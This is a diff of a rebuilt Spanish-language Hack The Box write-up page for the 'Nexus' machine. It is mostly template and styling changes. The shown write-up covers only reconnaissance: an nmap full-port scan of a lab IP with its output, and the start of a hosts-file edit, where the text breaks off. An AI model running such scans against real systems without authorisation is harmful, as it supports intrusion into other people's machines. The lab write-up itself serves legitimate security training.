@@ -1,14 +1,18 @@
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="es" class="no-js">
   <head>
     
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
+        <meta name="description" content="Write-ups de Hack The Box y guías de hardening">
       
       
-        <link rel="canonical" href="https://d4vKry.github.io/HTB/Easy/Nexus/">
+        <meta name="author" content="D4vKry">
+      
+      
+        <link rel="canonical" href="https://d4vkry.github.io/HTB/Easy/Nexus/">
       
       
         <link rel="prev" href="../Enigma/">
@@ -20,12 +24,12 @@
         
       
       
-      <link rel="icon" href="../../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/logo.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Nexus - Linux - D4vKry's Portfolio</title>
+        <title>Nexus - D4vKry</title>
       
     
     
@@ -46,10 +50,12 @@
         
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
       
     
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/extra.css">
     
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -65,7 +71,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="cyan">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -74,8 +80,8 @@
     <div data-md-component="skip">
       
         
-        <a href="#htb-nexus" class="md-skip">
-          Skip to content
+        <a href="#nexus" class="md-skip">
+          Saltar a contenido
         </a>
       
     </div>
@@ -89,11 +95,10 @@
   
 
 <header class="md-header md-header--shadow" data-md-component="header">
-  <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="D4vKry&#39;s Portfolio" class="md-header__button md-logo" aria-label="D4vKry's Portfolio" data-md-component="logo">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../../.." title="D4vKry" class="md-header__button md-logo" aria-label="D4vKry" data-md-component="logo">
       
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <img src="../../../assets/images/logo.svg" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -104,13 +109,13 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            D4vKry's Portfolio
+            D4vKry
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Nexus - Linux
+              Nexus
             
           </span>
         </div>
@@ -132,27 +137,29 @@
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
     <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
       <label class="md-search__icon md-icon" for="__search">
         
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
         
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
       </label>
-      <nav class="md-search__options" aria-label="Search">
+      <nav class="md-search__options" aria-label="Buscar">
         
-        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
           
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
         </button>
       </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
       
     </form>
     <div class="md-search__output">
       <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
         <div class="md-search-result" data-md-component="search-result">
           <div class="md-search-result__meta">
-            Initializing search
+            Inicializando búsqueda
           </div>
           <ol class="md-search-result__list" role="presentation"></ol>
         </div>
@@ -186,15 +193,14 @@
 
 
 
-<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="D4vKry&#39;s Portfolio" class="md-nav__button md-logo" aria-label="D4vKry's Portfolio" data-md-component="logo">
+    <a href="../../.." title="D4vKry" class="md-nav__button md-logo" aria-label="D4vKry" data-md-component="logo">
       
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <img src="../../../assets/images/logo.svg" alt="logo">
 
     </a>
-    D4vKry's Portfolio
+    D4vKry
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -236,15 +242,20 @@
     
     
     
+      
+        
+        
+      
     
-    <li class="md-nav__item md-nav__item--nested">
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
-          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
             
   
   
@@ -284,6 +295,8 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.85 6.74q.015 0 0 0M21.28 8.6c-.43-1.05-1.32-2.18-2.01-2.54.56 1.11.89 2.22 1.02 3.04v.02c-1.13-2.82-3.05-3.96-4.62-6.44-.08-.12-.17-.25-.24-.38-.04-.07-.07-.14-.11-.21-.06-.13-.12-.26-.15-.4 0-.01-.01-.02-.02-.02h-.03c-2.22 1.3-3.15 3.59-3.38 5.04-.69.04-1.37.21-1.99.51-.12.05-.17.19-.13.31.05.14.21.21.34.15.54-.26 1.14-.41 1.74-.45h.05c.08-.01.17-.01.25-.01.5-.01.97.06 1.44.2l.06.02c.1.02.17.06.25.06.05.04.11.06.16.08l.14.06c.07.03.14.06.2.09.03.02.06.03.09.05.07.04.16.07.2.11.04.02.08.05.12.07.73.45 1.34 1.07 1.75 1.81-.53-.37-1.49-.74-2.41-.58 3.6 1.81 2.63 8-2.36 7.76-.44-.01-.88-.1-1.3-.25-.1-.03-.2-.07-.29-.12-.05-.02-.12-.05-.17-.08-1.23-.63-2.24-1.82-2.38-3.27 0 0 .5-1.73 3.33-1.73.31 0 1.17-.86 1.2-1.1 0-.09-1.74-.78-2.42-1.45-.37-.36-.54-.53-.69-.66-.08-.07-.17-.13-.26-.19a4.63 4.63 0 0 1-.03-2.45C7.6 6.12 6.8 6.86 6.22 7.5c-.4-.5-.37-2.15-.35-2.5-.01 0-.3.16-.33.18-.35.25-.68.53-.98.82-.35.37-.66.74-.94 1.14-.62.91-1.12 1.95-1.34 3.04 0 .01-.1.41-.17.92l-.03.23c-.02.17-.04.32-.08.58v.41c0 5.53 4.5 10.01 10 10.01 4.97 0 9.08-3.59 9.88-8.33.02-.11.03-.24.05-.37.2-1.72-.02-3.52-.65-5.03"/></svg>
+  
   <span class="md-ellipsis">
     
   
@@ -320,22 +333,27 @@
     
     
     
+      
+        
+        
+      
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
             
   
   
   <span class="md-ellipsis">
     
   
-    Hack The Box - WriteUps
+    Hack The Box
   
 
     
@@ -351,7 +369,7 @@
             <span class="md-nav__icon md-icon"></span>
             
   
-    Hack The Box - WriteUps
+    Hack The Box
   
 
           </label>
@@ -368,6 +386,8 @@
     
     
     
+    
+      
     
     
     <li class="md-nav__item md-nav__item--active md-nav__item--nested">
@@ -417,10 +437,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Connected - Linux
+    Connected
   
 
     
@@ -445,10 +467,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Enigma - Linux
+    Enigma
   
 
     
@@ -482,10 +506,12 @@
           
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    Nexus - Linux
+    Nexus
   
 
     
@@ -500,10 +526,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    Nexus - Linux
+    Nexus
   
 
     
@@ -515,7 +543,7 @@
       
         
 
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
   
   
   
@@ -524,7 +552,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table of contents
+      Tabla de contenidos
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -810,6 +838,8 @@
     
     
     
+      
+    
     
     <li class="md-nav__item md-nav__item--nested">
       
@@ -858,10 +888,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Checkpoint - Windows
+    Checkpoint
   
 
     
@@ -886,10 +918,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    DevHub - Linux
+    DevHub
   
 
     
@@ -920,6 +954,8 @@
     
     
     
+    
+      
     
     
     <li class="md-nav__item md-nav__item--nested">
@@ -969,10 +1005,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Nimbus - Linux
+    Nimbus
   
 
     
@@ -1014,7 +1052,7 @@
                   <div class="md-sidebar__inner">
                     
 
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
   
   
   
@@ -1023,7 +1061,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table of contents
+      Tabla de contenidos
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -1298,46 +1336,61 @@
                   
 
 
+  
 
-<h1 id="htb-nexus">HTB | Nexus</h1>
-<p><strong>Machine</strong> - Nexus
-<strong>OS</strong> - Linux
-<strong>Difficulty</strong> - Easy
-<strong>IP</strong> - 10.129.175.212
-<strong>Fecha</strong> - 19/10/2026</p>
+<div class="dk-machine">
+  <div class="dk-machine__row">
+    <span class="dk-badge dk-badge--platform">Hack The Box</span>
+    <span class="dk-badge dk-badge--easy">Easy</span>
+    <span class="dk-badge dk-badge--os">
+      
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M220.9 123.3c1 .5 1.8 1.7 3 1.7 1.1 0 2.8-.4 2.9-1.5.2-1.4-1.9-2.3-3.2-2.9-1.7-.7-3.9-1-5.5-.1-.4.2-.8.7-.6 1.1.3 1.3 2.3 1.1 3.4 1.7M199 125c1.2 0 2-1.2 3-1.7 1.1-.6 3.1-.4 3.5-1.6.2-.4-.2-.9-.6-1.1-1.6-.9-3.8-.6-5.5.1-1.3.6-3.4 1.5-3.2 2.9.1 1 1.8 1.5 2.8 1.4m221 278.8c-3.6-4-5.3-11.6-7.2-19.7-1.8-8.1-3.9-16.8-10.5-22.4-1.3-1.1-2.6-2.1-4-2.9-1.3-.8-2.7-1.5-4.1-2 9.2-27.3 5.6-54.5-3.7-79.1-11.4-30.1-31.3-56.4-46.5-74.4-17.1-21.5-33.7-41.9-33.4-72C311.1 85.4 315.7.1 234.8 0 132.4-.2 158 103.4 156.9 135.2c-1.7 23.4-6.4 41.8-22.5 64.7-18.9 22.5-45.5 58.8-58.1 96.7-6 17.9-8.8 36.1-6.2 53.3-6.5 5.8-11.4 14.7-16.6 20.2-4.2 4.3-10.3 5.9-17 8.3s-14 6-18.5 14.5c-2.1 3.9-2.8 8.1-2.8 12.4 0 3.9.6 7.9 1.2 11.8 1.2 8.1 2.5 15.7.8 20.8-5.2 14.4-5.9 24.4-2.2 31.7 3.8 7.3 11.4 10.5 20.1 12.3 17.3 3.6 40.8 2.7 59.3 12.5 19.8 10.4 39.9 14.1 55.9 10.4 11.6-2.6 21.1-9.6 25.9-20.2 12.5-.1 26.3-5.4 48.3-6.6 14.9-1.2 33.6 5.3 55.1 4.1.6 2.3 1.4 4.6 2.5 6.7v.1c8.3 16.7 23.8 24.3 40.3 23 16.6-1.3 34.1-11 48.3-27.9 13.6-16.4 36-23.2 50.9-32.2 7.4-4.5 13.4-10.1 13.9-18.3.4-8.2-4.4-17.3-15.5-29.7M223.8 87.3c9.8-22.2 34.2-21.8 44-.4 6.5 14.2 3.6 30.9-4.3 40.4-1.6-.8-5.9-2.6-12.6-4.9 1.1-1.2 3.1-2.7 3.9-4.6 4.8-11.8-.2-27-9.1-27.3-7.3-.5-13.9 10.8-11.8 23-4.1-2-9.4-3.5-13-4.4-1-6.9-.3-14.6 2.9-21.8m-40.7-11.5c10.1 0 20.8 14.2 19.1 33.5-3.5 1-7.1 2.5-10.2 4.6 1.2-8.9-3.3-20.1-9.6-19.6-8.4.7-9.8 21.2-1.8 28.1 1 .8 1.9-.2-5.9 5.5-15.6-14.6-10.5-52.1 8.4-52.1m-13.6 60.7c6.2-4.6 13.6-10 14.1-10.5 4.7-4.4 13.5-14.2 27.9-14.2 7.1 0 15.6 2.3 25.9 8.9 6.3 4.1 11.3 4.4 22.6 9.3 8.4 3.5 13.7 9.7 10.5 18.2-2.6 7.1-11 14.4-22.7 18.1-11.1 3.6-19.8 16-38.2 14.9-3.9-.2-7-1-9.6-2.1-8-3.5-12.2-10.4-20-15-8.6-4.8-13.2-10.4-14.7-15.3q-2.1-7.35 4.2-12.3m3.3 334c-2.7 35.1-43.9 34.4-75.3 18-29.9-15.8-68.6-6.5-76.5-21.9-2.4-4.7-2.4-12.7 2.6-26.4v-.2c2.4-7.6.6-16-.6-23.9-1.2-7.8-1.8-15 .9-20 3.5-6.7 8.5-9.1 14.8-11.3 10.3-3.7 11.8-3.4 19.6-9.9 5.5-5.7 9.5-12.9 14.3-18 5.1-5.5 10-8.1 17.7-6.9 8.1 1.2 15.1 6.8 21.9 16l19.6 35.6c9.5 19.9 43.1 48.4 41 68.9m-1.4-25.9c-4.1-6.6-9.6-13.6-14.4-19.6 7.1 0 14.2-2.2 16.7-8.9 2.3-6.2 0-14.9-7.4-24.9-13.5-18.2-38.3-32.5-38.3-32.5-13.5-8.4-21.1-18.7-24.6-29.9s-3-23.3-.3-35.2c5.2-22.9 18.6-45.2 27.2-59.2 2.3-1.7.8 3.2-8.7 20.8-8.5 16.1-24.4 53.3-2.6 82.4.6-20.7 5.5-41.8 13.8-61.5 12-27.4 37.3-74.9 39.3-112.7 1.1.8 4.6 3.2 6.2 4.1 4.6 2.7 8.1 6.7 12.6 10.3 12.4 10 28.5 9.2 42.4 1.2 6.2-3.5 11.2-7.5 15.9-9 9.9-3.1 17.8-8.6 22.3-15 7.7 30.4 25.7 74.3 37.2 95.7 6.1 11.4 18.3 35.5 23.6 64.6 3.3-.1 7 .4 10.9 1.4 13.8-35.7-11.7-74.2-23.3-84.9-4.7-4.6-4.9-6.6-2.6-6.5 12.6 11.2 29.2 33.7 35.2 59 2.8 11.6 3.3 23.7.4 35.7 16.4 6.8 35.9 17.9 30.7 34.8-2.2-.1-3.2 0-4.2 0 3.2-10.1-3.9-17.6-22.8-26.1-19.6-8.6-36-8.6-38.3 12.5-12.1 4.2-18.3 14.7-21.4 27.3-2.8 11.2-3.6 24.7-4.4 39.9-.5 7.7-3.6 18-6.8 29-32.1 22.9-76.7 32.9-114.3 7.2m257.4-11.5c-.9 16.8-41.2 19.9-63.2 46.5-13.2 15.7-29.4 24.4-43.6 25.5s-26.5-4.8-33.7-19.3c-4.7-11.1-2.4-23.1 1.1-36.3 3.7-14.2 9.2-28.8 9.9-40.6.8-15.2 1.7-28.5 4.2-38.7 2.6-10.3 6.6-17.2 13.7-21.1.3-.2.7-.3 1-.5.8 13.2 7.3 26.6 18.8 29.5 12.6 3.3 30.7-7.5 38.4-16.3 9-.3 15.7-.9 22.6 5.1 9.9 8.5 7.1 30.3 17.1 41.6 10.6 11.6 14 19.5 13.7 24.6M173.4 148.7c2 1.9 4.7 4.5 8 7.1 6.6 5.2 15.8 10.6 27.3 10.6 11.6 0 22.5-5.9 31.8-10.8 4.9-2.6 10.9-7 14.8-10.4s5.9-6.3 3.1-6.6-2.6 2.6-6 5.1c-4.4 3.2-9.7 7.4-13.9 9.8-7.4 4.2-19.5 10.2-29.9 10.2s-18.7-4.8-24.9-9.7c-3.1-2.5-5.7-5-7.7-6.9-1.5-1.4-1.9-4.6-4.3-4.9-1.4-.1-1.8 3.7 1.7 6.5"/></svg>
+      
+      Linux
+    </span>
+    
+  </div>
+  <dl class="dk-machine__meta">
+    <div><dt>IP</dt><dd><code>10.129.175.212</code></dd></div>
+    <div><dt>Fecha</dt><dd>19/10/2026</dd></div>
+    
+  </dl>
+</div>
+
+<h1 id="nexus">Nexus<a class="headerlink" href="#nexus" title="Permanent link">&para;</a></h1>
 <p><img alt="hecho" src="hecho.png" /></p>
 <hr />
-<h2 id="1-enumeracion-reconnaissance">1. Enumeración (Reconnaissance)</h2>
-<h3 id="escaneo-de-puertos-nmap">Escaneo de Puertos (Nmap)</h3>
+<h2 id="1-enumeracion-reconnaissance">1. Enumeración (Reconnaissance)<a class="headerlink" href="#1-enumeracion-reconnaissance" title="Permanent link">&para;</a></h2>
+<h3 id="escaneo-de-puertos-nmap">Escaneo de Puertos (Nmap)<a class="headerlink" href="#escaneo-de-puertos-nmap" title="Permanent link">&para;</a></h3>
 <p>Comenzamos la fase de reconocimiento lanzando un escaneo completo sobre la máquina. Escaneamos todos los puertos (<code>-p-</code>), detectamos servicios y versiones junto a los scripts por defecto (<code>-sCV</code>) y aceleramos el proceso enviando al menos 5000 paquetes por segundo (<code>--min-rate=5000</code>):</p>
-<pre><code class="language-bash">sudo nmap -sCV -p- --min-rate=5000 -oN nmap.txt 10.129.175.212
-</code></pre>
-<pre><code class="language-text">Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-19 19:44 +0000
-Nmap scan report for 10.129.175.212
-Host is up (0.047s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
-|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
-80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://nexus.htb/
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 25.97 seconds
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sCV<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="o">=</span><span class="m">5000</span><span class="w"> </span>-oN<span class="w"> </span>nmap.txt<span class="w"> </span><span class="m">10</span>.129.175.212
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-19 19:44 +0000
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Nmap scan report for 10.129.175.212
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Host is up (0.047s latency).
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Not shown: 65533 closed tcp ports (reset)
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>PORT   STATE SERVICE VERSION
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>| ssh-hostkey: 
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>80/tcp open  http    nginx 1.24.0 (Ubuntu)
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>|_http-title: Did not follow redirect to http://nexus.htb/
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>Nmap done: 1 IP address (1 host up) scanned in 25.97 seconds
+</code></pre></div>
 <p>El escaneo nos deja únicamente dos puertos abiertos:</p>
 <ul>
 <li><strong>22 (SSH)</strong>: OpenSSH 9.6p1 sobre Ubuntu. Lo reservamos para cuando dispongamos de credenciales válidas.</li>
 <li><strong>80 (HTTP)</strong>: Un servidor nginx 1.24.0 que intenta redirigir al dominio <code>nexus.htb</code>. Deberemos añadir este dominio a nuestro <code>/etc/hosts</code> para que la resolución funcione.</li>
 </ul>
 <p>Añadimos el dominio a nuestro archivo de resolución:</p>
-<pre><code class="language-bash">sudo vim /etc/hosts
